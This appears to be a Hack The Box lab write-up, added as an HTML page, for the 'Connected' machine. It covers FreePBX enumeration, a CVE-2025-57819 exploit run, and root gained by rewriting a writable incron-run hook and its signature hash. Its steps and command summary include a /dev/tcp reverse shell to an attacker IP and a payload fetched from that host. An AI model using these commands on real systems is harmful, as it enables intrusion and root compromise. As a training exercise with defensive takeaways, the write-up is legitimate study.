@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Connected - HTB Report</title>
+    <link rel="stylesheet" href="../style.css">
+  </head>
+
+  <body>
+    <header>
+      <h1>Connected</h1>
+      <p>Hack The Box Machine Report</p>
+    </header>
+<main class="report">
+  <h2>Machine Info</h2>
+  <p><strong>Difficulty:</strong> Easy to Medium</p>
+  <p><strong>Operating System:</strong> Linux</p>
+  <p><strong>Status:</strong> Active / HTB Machine</p>
+  <p><strong>Date Completed:</strong> 15 June 2026</p>
+
+  <h2>Summary</h2>
+  <p>
+    Connected is a Linux machine that focuses on web enumeration, identifying a vulnerable FreePBX instance,
+    gaining an initial foothold through a public FreePBX vulnerability, and escalating privileges by abusing
+    writable FreePBX module hooks executed through an incron-based automation process.
+  </p>
+
+  <p>
+    Initial enumeration revealed SSH, HTTP, and HTTPS services. The web service redirected to a FreePBX
+    administration portal running FreePBX 16.0.40.7. This version was vulnerable to CVE-2025-57819, which allowed
+    unauthenticated access and led to remote code execution. After gaining a shell as the <code>asterisk</code>
+    user, local enumeration revealed writable FreePBX hook files and an incron rule that executed hooks as root.
+    By modifying a writable hook and updating the module signature hash, I was able to trigger the hook and
+    escalate to root.
+  </p>
+
+  <h2>Recon / Enumeration</h2>
+  <pre><code>nmap 10.129.15.209</code></pre>
+
+  <p>The initial scan found three open TCP ports.</p>
+
+  <table class="report-table">
+    <thead>
+      <tr>
+        <th>Port</th>
+        <th>Service</th>
+        <th>Version</th>
+        <th>Notes</th>
+        <th>Potential Interest</th>
+      </tr>
+    </thead>
+
+    <tbody>
+      <tr>
+        <td>22</td>
+        <td>SSH</td>
+        <td>OpenSSH 7.4</td>
+        <td>SSH was available but was not the initial entry point.</td>
+        <td>User enumeration was considered but not useful for the main path.</td>
+      </tr>
+
+      <tr>
+        <td>80</td>
+        <td>HTTP</td>
+        <td>Apache httpd 2.4.6, PHP 7.4.16</td>
+        <td>The site redirected to the FreePBX admin interface.</td>
+        <td>FreePBX 16.0.40.7, vulnerable web application.</td>
+      </tr>
+
+      <tr>
+        <td>443</td>
+        <td>HTTPS</td>
+        <td>Apache httpd 2.4.6</td>
+        <td>HTTPS was available but did not provide the main attack path.</td>
+        <td>Additional web surface.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>HTTP Enumeration</h2>
+  <p>
+    Port 80 redirected to the FreePBX web interface. After adding the hostname to <code>/etc/hosts</code>,
+    the web page loaded correctly.
+  </p>
+
+  <pre><code>echo "10.129.15.209 connected.htb" | sudo tee -a /etc/hosts
+
+
+curl -I http://connected.htb</code></pre>
+
+
+  <p>
+    The HTTP headers showed Apache on CentOS with PHP 7.4.16. The application redirected to the FreePBX
+    administration path.
+  </p>
+
+  <pre><code>HTTP/1.1 302 Found
+
+
+Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+X-Powered-By: PHP/7.4.16
+Location: /admin</code></pre>
+
+
+  <h2>Directory Enumeration</h2>
+  <p>
+    I used Gobuster to identify useful paths on the web server.
+  </p>
+
+  <pre><code>gobuster dir -u http://connected.htb \
+
+
+-w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
+
+
+  <p>Important results included:</p>
+
+  <ul>
+    <li><code>/admin</code> - FreePBX admin area</li>
+    <li><code>/ucp</code> - User Control Panel</li>
+    <li><code>/robots.txt</code> - readable robots file</li>
+    <li><code>/index.php</code> - redirects to <code>/admin</code></li>
+    <li><code>/.git</code> - existed but returned forbidden</li>
+  </ul>
+
+  <p>
+    Visiting the FreePBX login page revealed the exact version:
+  </p>
+
+  <pre><code>FreePBX 16.0.40.7</code></pre>
+
+  <h2>Vulnerability Identification</h2>
+  <p>
+    FreePBX 16.0.40.7 was below the patched FreePBX 16 endpoint version and matched the affected range for
+    CVE-2025-57819. This vulnerability involved unauthenticated SQL injection leading to administrator access
+    and remote code execution.
+  </p>
+
+  <p>
+    I first attempted older Metasploit FreePBX modules, but they failed because they targeted older versions
+    or different exploit paths. After identifying the more relevant FreePBX 16 issue, I used a public Python
+    proof of concept for CVE-2025-57819.
+  </p>
+
+  <h2>Initial Foothold</h2>
+  <p>
+    The exploit created an admin user through SQL injection, authenticated to the FreePBX admin panel, uploaded
+    or created a webshell, and then triggered a reverse shell.
+  </p>
+
+  <pre><code>python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.209 --lport 4444</code></pre>
+
+  <p>
+    The exploit successfully returned a shell as the <code>asterisk</code> user.
+  </p>
+
+  <pre><code>whoami
+
+
+id
+hostname</code></pre>
+
+
+  <p>Example user context:</p>
+
+  <pre><code>uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
+
+
+hostname: connected</code></pre>
+
+
+  <p>
+    The user flag was readable because it was owned by <code>root:asterisk</code> and had group read permission.
+  </p>
+
+  <pre><code>cat /home/asterisk/user.txt</code></pre>
+
+  <h2>Local Enumeration</h2>
+  <p>
+    After gaining access as <code>asterisk</code>, I transferred and ran LinPEAS to identify privilege escalation
+    paths.
+  </p>
+
+  <pre><code>python3 -m http.server 8080
+
+
+wget http://10.10.14.209:8080/linpeas.sh
+chmod +x linpeas.sh
+bash linpeas.sh | tee linpeas.out</code></pre>
+
+
+  <p>
+    Important findings included:
+  </p>
+
+  <ul>
+    <li>The current user was <code>asterisk</code>.</li>
+    <li>FreePBX and Asterisk configuration files were readable.</li>
+    <li>AMI credentials were present in <code>/etc/asterisk/manager.conf</code>.</li>
+    <li><code>incrond</code> was running as root.</li>
+    <li><code>/var/spool/asterisk/incron</code> was watched by incron.</li>
+    <li>FreePBX module hooks were processed by <code>/usr/bin/sysadmin_manager</code>.</li>
+  </ul>
+
+  <h2>Asterisk Manager Interface</h2>
+  <p>
+    The file <code>/etc/asterisk/manager.conf</code> contained AMI credentials. AMI was bound to localhost on
+    port 5038, so it was accessible from the target after gaining a shell.
+  </p>
+
+  <pre><code>cat /etc/asterisk/manager.conf
+
+
+nc 127.0.0.1 5038</code></pre>
+
+
+  <p>
+    I authenticated to AMI successfully, but AMI commands are Asterisk CLI commands, not normal Linux shell
+    commands. This confirmed useful access but did not directly provide root.
+  </p>
+
+  <pre><code>Action: Login
+
+
+Username: <AMI_USERNAME>
+Secret: <AMI_SECRET>
+Events: off
+
+Action: Command
+Command: core show version</code></pre>
+
+
+  <h2>Privilege Escalation</h2>
+  <p>
+    The main privilege escalation path came from abusing FreePBX's sysadmin hook mechanism. LinPEAS showed that
+    incron was watching <code>/var/spool/asterisk/incron</code> and running <code>/usr/bin/sysadmin_manager</code>
+    when files were modified.
+  </p>
+
+  <pre><code>cat /etc/incron.d/sysadmin</code></pre>
+
+  <p>The important rule was:</p>
+
+  <pre><code>/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#</code></pre>
+
+  <p>
+    Inspecting <code>/usr/bin/sysadmin_manager</code> showed that it processed FreePBX module hooks and executed
+    them after validating their hashes in the module signature file.
+  </p>
+
+  <pre><code>file /usr/bin/sysadmin_manager
+
+
+grep -nEi "argv|system|exec|shell_exec|passthru|incron|spool|asterisk" /usr/bin/sysadmin_manager</code></pre>
+
+
+  <p>
+    The key execution sink was:
+  </p>
+
+  <pre><code>system("$hookfile $params");</code></pre>
+
+  <p>
+    The vulnerable path was the UCP module's <code>logrotate</code> hook. The hook file was writable by the
+    <code>asterisk</code> user, and the module signature file could also be updated.
+  </p>
+
+  <pre><code>ls -la /var/www/html/admin/modules/ucp/hooks/
+
+
+ls -la /var/www/html/admin/modules/ucp/module.sig</code></pre>
+
+
+  <h3>Root Exploitation Steps</h3>
+
+  <p>First, I backed up the original hook.</p>
+
+  <pre><code>cp /var/www/html/admin/modules/ucp/hooks/logrotate /tmp/logrotate.bak</code></pre>
+
+  <p>Then I replaced the hook with a reverse shell payload.</p>
+
+  <pre><code>cat &gt; /var/www/html/admin/modules/ucp/hooks/logrotate &lt;&lt; 'EOF'
+
+
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/10.10.14.209/4445 0>&1"
+EOF
+
+chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate</code></pre>
+
+
+  <p>
+    Because <code>sysadmin_manager</code> checked the hook hash, I calculated the new SHA256 hash and updated
+    <code>module.sig</code>.
+  </p>
+
+  <pre><code>NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
+
+
+echo $NEW_HASH
+
+sed -i "s#hooks/logrotate = .*#hooks/logrotate = $NEW_HASH#" /var/www/html/admin/modules/ucp/module.sig
+
+grep "hooks/logrotate" /var/www/html/admin/modules/ucp/module.sig</code></pre>
+
+
+  <p>
+    On my attacker machine, I started a second listener.
+  </p>
+
+  <pre><code>nc -lvnp 4445</code></pre>
+
+  <p>
+    Finally, I triggered the incron watcher by touching the expected module hook trigger file.
+  </p>
+
+  <pre><code>touch /var/spool/asterisk/incron/ucp.logrotate</code></pre>
+
+  <p>
+    This caused <code>sysadmin_manager</code> to validate and execute the modified UCP hook as root, returning
+    a root shell to my listener.
+  </p>
+
+  <pre><code>id
+
+
+whoami
+cat /root/root.txt</code></pre>
+
+
+  <h2>Tools Used</h2>
+  <ul>
+    <li>Nmap</li>
+    <li>Curl</li>
+    <li>Gobuster</li>
+    <li>Python exploit script</li>
+    <li>Netcat</li>
+    <li>LinPEAS</li>
+    <li>Grep</li>
+    <li>Sed</li>
+    <li>sha256sum</li>
+  </ul>
+
+  <h2>Important Commands</h2>
+  <pre><code>nmap 10.129.15.209
+
+
+nmap -p 22 -sC -sV 10.129.15.209
+nmap -p 80 -sC -sV 10.129.15.209
+nmap -p 443 -sC -sV 10.129.15.209
+
+echo "10.129.15.209 connected.htb" | sudo tee -a /etc/hosts
+
+curl -I http://connected.htb
+curl -L http://connected.htb/admin/ | grep -iE "freepbx|version|login"
+
+gobuster dir -u http://connected.htb 
+-w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.209 --lport 4444
+
+whoami
+id
+hostname
+
+wget http://10.10.14.209:8080/linpeas.sh
+chmod +x linpeas.sh
+bash linpeas.sh | tee linpeas.out
+
+cat /etc/incron.d/sysadmin
+file /usr/bin/sysadmin_manager
+grep -nEi "argv|system|exec|incron|spool|asterisk" /usr/bin/sysadmin_manager
+
+ls -la /var/www/html/admin/modules/ucp/hooks/
+ls -la /var/www/html/admin/modules/ucp/module.sig
+
+cp /var/www/html/admin/modules/ucp/hooks/logrotate /tmp/logrotate.bak
+
+cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/10.10.14.209/4445 0>&1"
+EOF
+
+chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate
+
+NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
+sed -i "s#hooks/logrotate = .*#hooks/logrotate = $NEW_HASH#" /var/www/html/admin/modules/ucp/module.sig
+
+nc -lvnp 4445
+touch /var/spool/asterisk/incron/ucp.logrotate</code></pre>
+
+
+  <h2>Vulnerabilities / Misconfiguration</h2>
+  <p>
+    The initial foothold was possible because the target was running FreePBX 16.0.40.7, which was vulnerable
+    to CVE-2025-57819. This allowed unauthenticated SQL injection and led to remote code execution.
+  </p>
+
+  <p>
+    The privilege escalation issue came from weak file permissions combined with root-run file event automation.
+    The <code>asterisk</code> user could modify a FreePBX module hook and update the matching hash in
+    <code>module.sig</code>. When the incron watcher triggered <code>sysadmin_manager</code>, the modified hook
+    was executed as root.
+  </p>
+
+  <h2>Defensive Takeaways</h2>
+  <p>
+    FreePBX should be kept fully patched, especially when administrator or endpoint-related components are
+    exposed to a network. Administrative interfaces should be restricted to trusted networks or VPN-only access.
+  </p>
+
+  <p>
+    Local file permissions should be reviewed carefully. A low-privileged service account should not be able to
+    modify scripts or signature files that can later be executed by root. File integrity checks are not effective
+    if the same low-privileged user can modify both the executable file and the trusted hash source.
+  </p>
+
+  <p>
+    Root-run automation such as cron and incron should be treated as sensitive attack surface. Any watched file
+    or directory writable by a lower-privileged user can become a privilege escalation path.
+  </p>
+
+  <h2>Lessons Learned</h2>
+  <p>
+    This machine reinforced the importance of version enumeration. Identifying FreePBX 16.0.40.7 was the key
+    to finding the correct CVE and avoiding older FreePBX exploits that did not apply.
+  </p>
+
+  <p>
+    I also learned how important it is to understand Linux automation beyond normal cron jobs. In this machine,
+    <code>incron</code> was the critical privilege escalation clue because it executed root-controlled actions
+    when specific files changed.
+  </p>
+
+  <p>
+    The privilege escalation path also showed that signature validation can be bypassed if the attacker can
+    modify both the checked file and the signature/hash record. This was a useful lesson in why permissions and
+    trust boundaries matter as much as the validation logic itself.
+  </p>
+
+  <p><a href="../index.html">Back to all reports</a></p>
+</main>
+  </body>
+</html>
